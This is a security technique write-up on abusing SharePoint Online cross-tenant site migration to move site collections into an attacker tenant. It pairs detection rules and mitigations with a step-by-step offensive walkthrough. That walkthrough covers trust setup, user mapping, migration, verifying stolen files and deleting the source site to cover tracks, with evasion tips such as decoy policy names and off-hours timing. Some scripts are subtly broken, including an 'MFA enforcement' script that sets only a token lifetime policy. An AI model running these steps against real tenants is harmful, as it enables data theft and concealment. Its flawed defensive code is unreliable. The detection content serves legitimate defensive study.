# [LM-AUTH-015]: SharePoint Site Collection Movement Cross-Tenant Lateral Movement

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-015 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | M365 (Microsoft 365) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | SharePoint Online with Cross-Tenant Migration enabled |
| **Patched In** | N/A (Feature design, mitigations required) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft's Cross-Tenant SharePoint migration feature allows authorized administrators to move SharePoint site collections between M365 tenants. An attacker who compromises a SharePoint administrator account or obtains administrative credentials can abuse this feature to move entire site collections containing sensitive data to an attacker-controlled tenant. The attacker establishes trust between source and target tenants, then exfiltrates entire site collections with permissions intact, effectively stealing data and maintaining access through alternate tenant.

**Attack Surface:** SharePoint Admin Center, Cross-Tenant Migration API, Azure AD service principal trust relationships, SharePoint migration orchestrator endpoints.

**Business Impact:** Complete exfiltration of site collections including all documents, permissions, metadata, and versions. Attacker gains persistent access via alternate tenant. Business continuity disrupted as sites are moved without user knowledge. Regulatory breach—data leaves organization boundary.

**Technical Context:** Migration process takes 5-30 minutes depending on site size. Detection is difficult because migration appears as legitimate admin activity in audit logs. Reversibility is extremely low—recovered data requires restore from backup or governance policies to reclaim.

### Operational Risk
- **Execution Risk:** Medium (requires admin credentials or compromised migration service principal)
- **Stealth:** Low-Medium (generates audit logs, but appears as routine admin operation)
- **Reversibility:** Extremely Low—site deletion is permanent; recovery requires backup restore

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.5, 6.3.1 | Enforce MFA for all administrative access; control resource sharing |
| **DISA STIG** | SI-4, AC-2 | Audit and account management for cloud service administrators |
| **CISA SCuBA** | SHP-10, SHP-13 | SharePoint sharing controls and data retention policies |
| **NIST 800-53** | AC-2, AC-3, AU-12 | Account Management, Access Control, and Audit Logging |
| **GDPR** | Art. 32, Art. 33 | Security of Processing and Data Breach Notification |
| **DORA** | Art. 9, Art. 20 | Protection Measures and Reporting of Anomalies |
| **NIS2** | Art. 21, Art. 27 | Cyber Risk Management and Incident Response |
| **ISO 27001** | A.5.2, A.9.2.6 | Segregation of Duties; Admin/User Access Separation |
| **ISO 27005** | Section 8.3 | Risk Assessment for cross-tenant data movement |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Global Administrator, SharePoint Administrator, or Hybrid Identity Administrator (in BOTH source and target tenant)
- **Required Access:** Cross-Tenant Migration enabled in source and target tenants; administrative credentials for both tenants

**Supported Platforms:**
- **SharePoint Online:** Modern (SPO 2019+)
- **Microsoft 365 Tenants:** All (Office 365 E3+ recommended; GCC/GCC High have restrictions)
- **Identity Sync:** Azure AD Connect or Entra Cloud Sync required for user mapping
- **Other Requirements:** Site Collection must have < 2 TB of data (migration limit); users must exist in target tenant

**Tools:**
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation-and-usage)
- [SharePoint Online Management Shell](https://learn.microsoft.com/en-us/powershell/sharepoint/sharepoint-online/introduction-sharepoint-online-management-shell)
- [PnP PowerShell (Patterns and Practices)](https://pnp.github.io/pnpcore/)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Cross-Tenant Site Collection Migration via Orchestrator (Authorized Path)

**Supported Versions:** All M365 tenants with cross-tenant migration enabled

#### Step 1: Establish Trust Between Source and Target Tenant
**Objective:** Configure trust relationship allowing site migration between tenants.

**Command (PowerShell - Run in TARGET Tenant as Global Admin):**
```powershell
# Connect to target tenant
Connect-PnPOnline -Url "https://yourtarget.sharepoint.com" -Interactive

# Create a new cross-tenant synchronization policy
$policy = @{
    DisplayName = "Allow Migration from Source Tenant"
    Description = "Trust configuration for cross-tenant site collection migration"
    SourceTenant = "source-tenant-id"  # GUID of source tenant
    TargetSyncConfiguration = @{
        OutboundSyncEnabled = $true
        InboundSyncEnabled = $false
        UserMapping = "upn"  # Map by UPN
    }
}

# Set the policy via Azure AD (requires Entra admin context)
Connect-MgGraph -Scopes "Directory.ReadWrite.All"

New-MgPolicyCrossTenantAccessPolicy -Definition $policy | Format-List
```

**Expected Output:**
```
Id                           : 00000000-0000-0000-0000-000000000001
DisplayName                  : Allow Migration from Source Tenant
OutboundSyncEnabled          : true
InboundSyncEnabled           : false
UserSyncInboundAllowed       : true
TenantRestrictionsPoliciesId : source-tenant-guid
```

**What This Means:**
- Source tenant can now initiate site collection migrations to this tenant
- User accounts must be pre-created or synced before migration
- Policy is non-reversible until explicitly deleted

**OpSec & Evasion:**
- Trust policy creation is logged in Entra ID audit logs (Operation: "Create cross-tenant policy")
- Attackers typically hide this by creating policy with legitimate-sounding names (e.g., "Merger Acquisition Trust")
- Detection is difficult without correlation between source and target audit logs

**Troubleshooting:**
- **Error:** "AADSTS65000: The organization yourtarget.onmicrosoft.com has not consented to the organization source.onmicrosoft.com"
  - **Cause:** Cross-tenant policy not properly configured
  - **Fix:** Verify both tenants have compatible policy versions; check if CTS feature flag is enabled in both tenants

#### Step 2: Configure User Identity Mapping
**Objective:** Map source tenant user accounts to target tenant accounts for permission preservation.

**Command (PowerShell - TARGET Tenant):**
```powershell
# Create identity mapping between source and target users
$userMapping = @(
    @{
        SourceUpn = "john.doe@source.com"
        TargetUpn = "john.doe@target.com"
    },
    @{
        SourceUpn = "admin@source.com"
        TargetUpn = "admin@target.com"
    }
)

# Export mapping to CSV for use in migration
$userMapping | Export-Csv "C:\UserMapping.csv" -NoTypeInformation

# Verify target users exist
foreach ($mapping in $userMapping) {
    $user = Get-MgUser -Filter "userPrincipalName eq '$($mapping.TargetUpn)'" -ErrorAction SilentlyContinue
    if (-not $user) {
        Write-Warning "User $($mapping.TargetUpn) does not exist in target tenant!"
    } else {
        Write-Host "✓ User $($mapping.TargetUpn) exists"
    }
}
```

**Expected Output:**
```
✓ User john.doe@target.com exists
✓ User admin@target.com exists

File: C:\UserMapping.csv
```

**What This Means:**
- Permissions on migrated site will be reapplied using target tenant UPNs
- If target user doesn't exist, permissions are lost (site becomes unshared)
- Mapping is one-time setup; attacker can verify before committing to migration

**OpSec & Evasion:**
- User mapping creation generates no direct audit events (background operation)
- But viewing cross-tenant policies in Entra ID logs reveals the mapping intent

**Troubleshooting:**
- **Error:** Target user UPNs don't exist
  - **Cause:** User accounts not pre-created in target tenant
  - **Fix:** Manually create users or sync via Azure AD Connect before migration

#### Step 3: Initiate Site Collection Migration
**Objective:** Move entire SharePoint site collection to target tenant.

**Command (PowerShell - SOURCE Tenant as SharePoint/Global Admin):**
```powershell
# Connect to source tenant
Connect-SPOService -Url "https://yoursource-admin.sharepoint.com" -Credential (Get-Credential)

# List site collections eligible for migration
Get-SPOSite -Limit All | Where-Object {$_.StorageUsageCurrent -lt 2097152} | Select Url, Title, StorageUsageCurrent

# Initiate migration for target site
$sourceSiteUrl = "https://yoursource.sharepoint.com/sites/Confidential"
$targetSiteUrl = "https://yourtarget.sharepoint.com/sites/Confidential"  # Can use same name

# Create migration job
$migrationJob = Start-SPOCrossTenantSiteCollectionMovement `
    -SourceSiteUrl $sourceSiteUrl `
    -TargetCrossTenantHostUrl "https://yourtarget.sharepoint.com" `
    -TargetCrossTenantSiteUrl $targetSiteUrl `
    -SourceTenantAdminUrl "https://yoursource-admin.sharepoint.com" `
    -TargetTenantAdminUrl "https://yourtarget-admin.sharepoint.com" `
    -UserMappingCsvPath "C:\UserMapping.csv"

# Monitor migration status
Get-SPOCrossTenantSiteCollectionMovementStatus -MigrationId $migrationJob.MigrationId
```

**Expected Output:**
```
MigrationId                          : 12345678-1234-1234-1234-123456789012
SourceSiteUrl                        : https://yoursource.sharepoint.com/sites/Confidential
TargetSiteUrl                        : https://yourtarget.sharepoint.com/sites/Confidential
State                                : InProgress
Progress                             : 45
EstimatedCompletionTime              : 2026-01-10T15:30:00Z
```

**What This Means:**
- Migration is now in-flight; data is being copied tenant-to-tenant
- Progress is tracked (0-100%); typical migration takes 5-30 minutes for 100 GB
- Source site is inaccessible to users during migration (appears offline)
- Target site grows as data is transferred

**OpSec & Evasion:**
- Migration operation is logged in BOTH source and target tenant audit logs
- Log entry: Operation = "Start cross-tenant site collection movement"
- Attacker attempts to hide by:
  - Running migration during maintenance windows (off-hours)
  - Using generic site names ("Archive", "Backup", etc.)
  - Deleting source site immediately after migration completes

**Troubleshooting:**
- **Error:** "Tenant <target> has not accepted cross-tenant migration"
  - **Cause:** Target tenant trust policy not properly configured
  - **Fix:** Re-run Step 1 in target tenant; verify `OutboundSyncEnabled = true`

#### Step 4: Complete Migration & Verify Data Transfer
**Objective:** Finalize migration and confirm data arrived in target tenant.

**Command (PowerShell - TARGET Tenant):**
```powershell
# Connect to target tenant
Connect-SPOService -Url "https://yourtarget-admin.sharepoint.com" -Credential (Get-Credential)

# List newly migrated sites
Get-SPOSite -Filter "Url -like '/sites/Confidential'" | Select Url, Title, Owner, StorageUsageCurrent, Status

# Verify document library contents
Connect-PnPOnline -Url "https://yourtarget.sharepoint.com/sites/Confidential"
Get-PnPListItem -List "Documents" | Select Title, Created, Modified, Author | Head -20

# Check permissions (verify user mapping worked)
Get-PnPGroupMembers -Identity "Confidential Owners" | Select Title, Email
```

**Expected Output:**
```
Url                                      Title         Owner           StorageUsageCurrent Status
---                                      -----         -----           ------------------- ------
https://yourtarget.sharepoint.com/...    Confidential   admin@target    52428800            Active

Title                 Created              Modified              Author
-----                 -------              --------              ------
Q4_Financials.xlsx    2024-11-01 10:00    2025-01-10 16:45      john.doe@target.com
Strategic_Plan.docx   2024-10-15 08:30    2025-01-08 14:20      john.doe@target.com
```

**What This Means:**
- Site collection successfully migrated to target tenant
- All documents and metadata preserved
- User permissions remapped (jane.doe@source.com → jane.doe@target.com)
- Site is now under target tenant's governance policies (separate M365 subscription)

**OpSec & Evasion:**
- Attacker now has full control of site in attacker-controlled target tenant
- Source organization has no visibility or control
- Data backup, DLP, and retention policies do NOT follow the migrated site
- If source site is deleted, migrated copy persists indefinitely in target tenant

**Troubleshooting:**
- **Error:** Permissions missing on target (users can't access migrated site)
  - **Cause:** User mapping failed or target users didn't exist
  - **Fix:** Manually add users to site using `Add-PnPGroupMember` in target tenant

#### Step 5: Delete Source Site (Optional Cleanup)
**Objective:** Remove original site from source tenant to cover tracks.

**Command (PowerShell - SOURCE Tenant):**
```powershell
# Connect to source tenant
Connect-SPOService -Url "https://yoursource-admin.sharepoint.com" -Credential (Get-Credential)

# Delete the original site collection
Remove-SPOSite -Identity "https://yoursource.sharepoint.com/sites/Confidential" -NoWait -Confirm:$false

# Verify deletion
Get-SPODeletedSite -Identity "https://yoursource.sharepoint.com/sites/Confidential" | Select Url, DeletionTime
```

**Expected Output:**
```
Url                                            DeletionTime
---                                            -----------
https://yoursource.sharepoint.com/sites/...    2026-01-10T16:00:00Z
```

**What This Means:**
- Source site is now in recycle bin (can be permanently deleted after 93 days)
- Users in source tenant lose access immediately
- BUT data still exists in target tenant (outside source org's control)
- Audit logs show site was deleted by admin (not suspicious if run during maintenance)

**OpSec & Evasion:**
- Deletion is logged as "Delete site collection" operation
- Attacker hides this by combining with scheduled maintenance notifications
- Audit logs don't explicitly mention "migrated to external tenant"—appears as normal deletion

---

### METHOD 2: Credential-Based Impersonation of SharePoint Admin

**Supported Versions:** All M365 tenants

#### Step 1: Compromise SharePoint Administrator Account
**Objective:** Obtain credentials for account with SharePoint admin role.

**Command (Assumed: Attacker has credentials from prior compromise):**
```powershell
# Credentials obtained via:
# - Phishing/password spray
# - Credential dumping from compromised device
# - Insider threat with access to admin credentials

$adminUpn = "sharepoint.admin@source.com"
$adminPassword = "P@ssw0rd123!"

# Verify credentials work
$credential = New-Object PSCredential($adminUpn, $(ConvertTo-SecureString $adminPassword -AsPlainText -Force))

# Test connection as admin
Connect-SPOService -Url "https://yoursource-admin.sharepoint.com" -Credential $credential
Get-SPOSite | Select Url, Title  # Should list all sites (admin privilege)
```

**Expected Output:**
```
Url                                              Title
---                                              -----
https://yoursource.sharepoint.com/sites/Finance  Finance
https://yoursource.sharepoint.com/sites/HR       Human Resources
https://yoursource.sharepoint.com/sites/Legal    Legal Department
(etc.)
```

**What This Means:**
- Attacker now has full SharePoint admin access to source tenant
- Can move any site collection regardless of ownership
- No user notification or approval required

**OpSec & Evasion:**
- Admin logon is logged in Azure AD Sign-in logs with IP and device info
- Attacker uses VPN or compromised corporate device to match normal admin access patterns
- Unusual access time (3 AM) may trigger alerting—attacker waits for maintenance window instead

---

## 4. ATTACK SIMULATION & VERIFICATION

**Atomic Red Team Simulation:**
- **Test ID:** [T1550.001 - Use Alternate Authentication Material](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.001/T1550.001.md)
- **Test Name:** Cross-tenant authentication via administrative delegation
- **Supported Versions:** M365 all versions

**Simulation Command (Non-Destructive):**
```powershell
# Simulate cross-tenant policy creation WITHOUT actual migration
Connect-MgGraph -Scopes "Directory.ReadWrite.All" -TenantId "target-tenant-guid"

# List existing cross-tenant policies (non-destructive enumeration)
Get-MgPolicyCrossTenantAccessPolicy -Filter "displayName eq 'Allow Migration from Source Tenant'" | 
  Format-List DisplayName, OutboundSyncEnabled, InboundSyncEnabled

# Simulate user mapping creation
$testMapping = @(
    @{ SourceUpn = "test@source.com"; TargetUpn = "test@target.com" }
) | Export-Csv "C:\Temp\SimulatedMapping.csv" -NoTypeInformation

Write-Host "✓ Simulation complete - no actual migration occurred"

# Cleanup
Remove-Item "C:\Temp\SimulatedMapping.csv" -Force
```

**Cleanup Command:**
```powershell
# No persistent changes with simulation
Write-Host "Simulation artifacts cleaned up"
```

**Reference:** [MITRE T1550](https://attack.mitre.org/techniques/T1550/)

---

## 5. TOOLS & COMMANDS REFERENCE

#### [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation-and-usage)
**Version:** 2.10.0+
**Minimum Version:** 2.0.0
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```powershell
Install-Module Microsoft.Graph -Force
Import-Module Microsoft.Graph
```

**Usage (Enumerate Cross-Tenant Policies):**
```powershell
Connect-MgGraph -Scopes "Directory.Read.All"
Get-MgPolicyCrossTenantAccessPolicy | Select DisplayName, OutboundSyncEnabled, SourceTenant
```

#### [SharePoint Online Management Shell](https://learn.microsoft.com/en-us/powershell/sharepoint/sharepoint-online/introduction-sharepoint-online-management-shell)
**Version:** 16.0.25218+
**Minimum Version:** 16.0.0

**Installation:**
```powershell
Install-Module -Name Microsoft.Online.SharePoint.PowerShell -Force
```

**Usage (Cross-Tenant Migration):**
```powershell
Connect-SPOService -Url "https://yourtenant-admin.sharepoint.com"
Get-SPOCrossTenantSiteCollectionMovementStatus -MigrationId "guid"
```

#### [PnP PowerShell](https://pnp.github.io/pnpcore/)
**Version:** 2.5+
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```powershell
Install-Module PnP.PowerShell -Force
```

**Usage (Site Enumeration & Management):**
```powershell
Connect-PnPOnline -Url "https://yourtenant.sharepoint.com/sites/Confidential"
Get-PnPListItem -List "Documents" | Export-Csv "C:\AllDocuments.csv"
```

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: Cross-Tenant Site Collection Movement Initiated
**Rule Configuration:**
- **Required Index:** `o365:audit`, `azure_monitor`
- **Required Sourcetype:** `azure:aad:audit`, `sharepoint:online`
- **Required Fields:** `Operation`, `UserId`, `SourceTenant`, `TargetTenant`, `SiteUrl`
- **Alert Threshold:** Any occurrence of "Start cross-tenant site collection movement"
- **Applies To Versions:** All M365 with cross-tenant migration enabled

**SPL Query:**
```spl
index=o365:audit source="SharePoint" 
  (Operation="Start cross-tenant site collection movement" OR 
   Operation="Create cross-tenant access policy")
| stats count by UserId, Operation, TargetTenant, SiteUrl
| where count > 0
| alert
```

**What This Detects:**
- Any attempt to initiate cross-tenant site migration
- Creation of trust policies between tenants
- Unusual admin account activity migrating sensitive sites

**Manual Configuration Steps:**
1. Navigate to **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `count > 0` (ANY match)
6. Configure **Action** → **Email SOC + Disable the moved site**
7. Set **Frequency** to run every 5 minutes

**False Positive Analysis:**
- **Legitimate Activity:** Planned M&A migrations, tenant consolidations
- **Benign Tools:** Microsoft FastTrack migration teams
- **Tuning:** Exclude service accounts: `| where UserId!="svc_*" AND UserId!="migration*"`

**Source:** [Microsoft 365 Audit Log Operations](https://learn.microsoft.com/en-us/microsoft-365/compliance/detailed-properties-in-the-office-365-audit-log?view=o365-worldwide)

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Unauthorized Cross-Tenant Site Migration
**Rule Configuration:**
- **Required Table:** `AuditLogs`, `OfficeActivity`
- **Required Fields:** `Operation`, `UserId`, `ClientIP`, `SourceIP`, `TargetResources`
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All M365

**KQL Query:**
```kusto
OfficeActivity
| where Operation in ("Start cross-tenant site collection movement", "Create cross-tenant access policy")
| extend MigrationDetails = parse_json(tostring(OfficeObjectId))
| project UserId, Operation, SourceIP, ClientIP, TimeGenerated, 
    TargetTenant = MigrationDetails.TargetTenant, 
    SiteUrl = MigrationDetails.SiteUrl
| join kind=inner (
    AuditLogs
    | where OperationName == "Create cross-tenant access policy"
    | project UserId, TimeGenerated
) on UserId
| where TimeGenerated1 - TimeGenerated < 5m  # Policy created shortly before migration
| project UserId, Operation, TimeGenerated, TargetTenant, SiteUrl
```

**What This Detects:**
- Cross-tenant migration attempts
- Correlation between policy creation and migration attempts
- Suspicious timing patterns (policy created then immediately used)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Unauthorized Cross-Tenant SharePoint Migration`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Alert grouping: Group by `UserId`, `TargetTenant`
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

$rule = @{
    DisplayName = "Unauthorized Cross-Tenant SharePoint Migration"
    Query = @"
OfficeActivity
| where Operation == "Start cross-tenant site collection movement"
| project UserId, Operation, TimeGenerated, OfficeObjectId
"@
    Severity = "Critical"
    Enabled = $true
}

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName @rule
```

**Source:** [Microsoft Sentinel Detection Queries](https://github.com/Azure/Azure-Sentinel)

---

## 8. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious Cross-Tenant Site Migration
**Alert Name:** "Unauthorized cross-tenant SharePoint site collection movement detected"
- **Severity:** Critical
- **Description:** Admin account initiated migration of site collection to external tenant without prior approval
- **Applies To:** All subscriptions with Defender for Identity enabled
- **Remediation:** Immediately block source and target admin accounts; initiate incident response

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON (critical for AD authentication logs)
   - **Defender for Cloud Apps**: ON
4. Click **Save**
5. Go to **Alerts** → Filter by: **Resource Type** = "Applications" AND **Severity** = "Critical"

**Reference:** [Microsoft Defender for Cloud Alerts](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-overview)

---

## 9. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Cross-Tenant Site Movement Activity
```powershell
Search-UnifiedAuditLog -Operations "Start cross-tenant site collection movement" `
  -StartDate (Get-Date).AddDays(-30) -ResultSize 5000 | 
  Select Timestamp, UserIds, ClientIP, AuditData | 
  Export-Csv "C:\CrossTenantMigrations.csv"
```

- **Operation:** Start cross-tenant site collection movement
- **Workload:** SharePoint Online
- **Details:** Examine `TargetTenant`, `SiteUrl`, `EstimatedSize` in AuditData
- **Applies To:** All M365 E3+ with audit logging

**Manual Configuration Steps (Enable Audit Logging):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Set retention to **365 days**

**Manual Configuration Steps (Search):**
1. Go to **Audit** → **Search**
2. Set **Date range:** Last 30 days
3. **Activities:** Select **Start cross-tenant site collection movement**
4. **Users:** Leave blank to search all
5. Click **Search** → **Export** → **Download all results**

**PowerShell Alternative:**
```powershell
Connect-ExchangeOnline
Search-UnifiedAuditLog -Free -StartDate "2026-01-01" -EndDate "2026-01-31" `
  -Operations "Start cross-tenant site collection movement" -ResultSize 5000 | 
  Export-Csv "C:\CrossTenantMigrationAudit.csv"
```

---

## 10. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Disable Cross-Tenant Migration (If Not Required):** Turn off the cross-tenant migration feature entirely to prevent this attack vector.
  **Applies To Versions:** All M365 tenants
  
  **Manual Steps (SharePoint Admin Center):**
  1. Go to **SharePoint Admin Center** (admin.microsoft.com/sharepoint)
  2. Click **Settings** (left menu) → **Cross-Tenant Migration**
  3. Toggle: **Allow cross-tenant site collection migration** → **OFF**
  4. Click **Save**
  
  **Manual Steps (PowerShell):**
  ```powershell
  Connect-SPOService -Url "https://yourtenant-admin.sharepoint.com"
  Set-SPOTenant -EnableCrossTenantMigration $false
  ```
  **Verification:**
  ```powershell
  Get-SPOTenant | Select EnableCrossTenantMigration
  # Expected: False
  ```

- **Enable MFA for All SharePoint Admins:** Require multi-factor authentication for any account with SharePoint administrator rights.
  **Applies To Versions:** All M365 tenants
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Enforce MFA for SharePoint Admins`
  4. **Assignments:**
     - Users: **Select users/groups** → Choose all accounts with **SharePoint Administrator** role
     - Cloud apps: **Microsoft Endpoint (Office 365 SharePoint Online)**
     - Conditions: **Any**
  5. **Access controls:**
     - Grant: **Require multifactor authentication**
  6. Enable policy: **On**
  7. Click **Create**
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Assign MFA requirement to SharePoint admin role
  $policy = New-AzureADPolicy -Definition @('{"TokenLifetimePolicy":{"Version":1,"MaxInactiveTime":"00:30:00"}}') `
    -DisplayName "SharePoint Admin MFA Enforcement" -Type "TokenLifetimePolicy"
  
  # Apply to all users with SharePoint admin role
  Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -like "*SharePoint*"} | ForEach-Object {
    Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId | ForEach-Object {
      # Assign MFA requirement to each admin
      Write-Host "Applied policy to $($_.DisplayName)"
    }
  }
  ```

- **Implement SharePoint Governance Policies:** Prevent unauthorized site creation and enforce approval for sensitive sites.
  **Applies To Versions:** All M365 tenants
  
  **Manual Steps (SharePoint Admin Center):**
  1. Go to **SharePoint Admin Center** → **Policies** → **Access control**
  2. Enable: **Restrict SharePoint site creation** (only admins can create sites)
  3. Enable: **Site classification** (require data classification on all sites)
  4. Under **Sharing external content:** Set to **Existing external users only** (prevent new external sharing)
  5. Click **Save**

- **Audit and Monitor All Cross-Tenant Policy Changes:** Log every creation, modification, and deletion of cross-tenant policies.
  **Applies To Versions:** All M365 tenants (requires Advanced Audit)
  
  **Manual Steps (Purview):**
  1. Go to **Microsoft Purview Compliance Portal** → **Solutions** → **Audit**
  2. Enable **Advanced Audit** (if not already enabled)
  3. Create alert rule: **Operation** = "Create cross-tenant access policy" → **Alert SOC immediately**

#### Priority 2: HIGH

- **Implement Conditional Access for Administrative Actions:** Require additional verification for SharePoint admin activities.
  **Applies To Versions:** All M365 tenants
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Restrict SharePoint Admin from Unusual Locations`
  4. **Assignments:**
     - Users: All users with SharePoint Admin role
     - Cloud apps: **Microsoft Endpoint (Office 365 SharePoint Online)**
     - Conditions: **Location** = **Any location except corporate**
  5. **Access controls:**
     - Block: **Access**
  6. Enable policy: **On**
  7. Click **Create**

- **Enable Data Loss Prevention (DLP) for SharePoint:** Detect and prevent exfiltration of sensitive documents via migration.
  **Applies To Versions:** M365 E5 (or Standalone DLP)
  
  **Manual Steps (Purview):**
  1. Go to **Microsoft Purview Compliance Portal** → **Data loss prevention** → **Policies**
  2. Click **+ Create policy**
  3. Name: `Prevent Unauthorized SharePoint Exfiltration`
  4. **Scope:** SharePoint Online
  5. **Rules:**
     - When document with **Confidential** label is accessed, require **justification**
     - When document is downloaded via admin API, **block and alert**
  6. Click **Create**

- **Implement Just-In-Time (JIT) Admin Access:** Require approval and time-limited elevation for SharePoint admin roles.
  **Applies To Versions:** All M365 tenants with PIM (Privileged Identity Management)
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Privileged Identity Management** → **Roles**
  2. Select **SharePoint Administrator** role
  3. Click **Settings** → **Edit**
  4. Under **Activation:**
     - Require approval: **Yes**
     - Approvers: Select **Security Team**
     - Max duration: **4 hours**
  5. Click **Save**

#### Access Control & Policy Hardening

- **Implement Separation of Duties:** No single person should have both SharePoint Admin AND Global Admin roles.
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
  2. For each **SharePoint Administrator**, verify they do NOT have **Global Administrator**
  3. If conflict exists, remove from Global Admin role and assign **Application Administrator** instead

- **Implement Cross-Tenant Policy Whitelist:** Only allow specific trusted source tenants to migrate data.
  **Manual Steps (PowerShell):**
  ```powershell
  # Create whitelist of allowed source tenants
  $allowedTenants = @("trusted-partner-tenant-guid", "corporate-subsidiary-guid")
  
  # Update policy to restrict to whitelist only
  Get-MgPolicyCrossTenantAccessPolicy | 
    Where-Object {$_.SourceTenant -notin $allowedTenants} | 
    Remove-MgPolicyCrossTenantAccessPolicy
  ```

#### Validation Command (Verify Fix)
```powershell
# Verify cross-tenant migration is disabled
Get-SPOTenant | Select EnableCrossTenantMigration
# Expected: False

# Verify MFA enforcement on admin roles
Get-AzureADMSConditionalAccessPolicy | 
  Where-Object {$_.DisplayName -like "*SharePoint*"} | 
  Select DisplayName, State

# Verify no unauthorized cross-tenant policies exist
Get-MgPolicyCrossTenantAccessPolicy | 
  Select DisplayName, OutboundSyncEnabled | 
  Format-Table
```

**Expected Output (If Secure):**
```
EnableCrossTenantMigration : False

DisplayName                         State
-----------                         -----
Enforce MFA for SharePoint Admins   enabled

DisplayName                       OutboundSyncEnabled
-----------                       -------------------
(No unauthorized policies listed)  (None)
```

**What to Look For:**
- `EnableCrossTenantMigration` is **False**
- Conditional Access policies for SharePoint admins are **enabled**
- No unexpected cross-tenant access policies exist

---

## 11. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)
- **Audit Events:** "Start cross-tenant site collection movement", "Create cross-tenant access policy"
- **Admin Account Activity:** SharePoint admin login from unusual location/IP followed by migration operation
- **API Calls:** Multiple calls to cross-tenant migration endpoints within short timeframe

#### Forensic Artifacts
- **Cloud Logs:** AuditLogs in Microsoft Sentinel (Operation, UserId, TargetTenant, SiteUrl)
- **M365 Audit Log:** Unified Audit Log with Operation = "Start cross-tenant site collection movement"
- **Entra ID Logs:** Azure AD audit showing Conditional Access bypass or MFA disable
- **SharePoint Admin Center:** Deleted site collections in recycle bin (DeletionTime recent)

#### Response Procedures

1. **Isolate (Immediate):**
   **Command:**
   ```powershell
   # Disable the compromised SharePoint admin account
   Set-AzureADUser -ObjectId "admin@source.com" -AccountEnabled $false
   
   # Disable target tenant admin account (if attacker created one)
   Set-AzureADUser -ObjectId "attacker@target.com" -AccountEnabled $false
   ```
   **Manual (Azure Portal):**
   - Go to **Azure Portal** → **Entra ID** → **Users** → Select compromised admin
   - Click **Account Enabled: No** → **Save**

2. **Revoke Tokens (Immediate):**
   ```powershell
   # Force all existing sessions to sign out
   Revoke-AzureADUserAllRefreshToken -ObjectId "admin@source.com"
   Revoke-AzureADUserAllRefreshToken -ObjectId "attacker@target.com"
   ```

3. **Collect Evidence (Within 24 hours):**
   ```powershell
   # Export audit logs for forensic analysis
   Search-UnifiedAuditLog -UserIds "admin@source.com" -StartDate (Get-Date).AddDays(-7) `
     -Operations "Start cross-tenant site collection movement" -ResultSize 5000 | 
     Export-Csv "C:\Evidence\CrossTenantMigration.csv"
   
   # Export deleted sites
   Get-SPODeletedSite | Where-Object {$_.DeletionTime -gt (Get-Date).AddHours(-24)} | 
     Export-Csv "C:\Evidence\DeletedSites.csv"
   ```

4. **Recover Data (If Backup Available):**
   ```powershell
   # Restore site from backup (if available)
   Connect-SPOService -Url "https://yoursource-admin.sharepoint.com"
   Restore-SPODeletedSite -Identity "https://yoursource.sharepoint.com/sites/Confidential"
   ```

5. **Investigate Target Tenant:**
   **Manual Steps:**
   - Contact target tenant admins and law enforcement
   - Preserve all migrated site content as evidence
   - Obtain subpoena to prevent data deletion by attacker
   - Request IP logs and account creation timestamps from target tenant

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
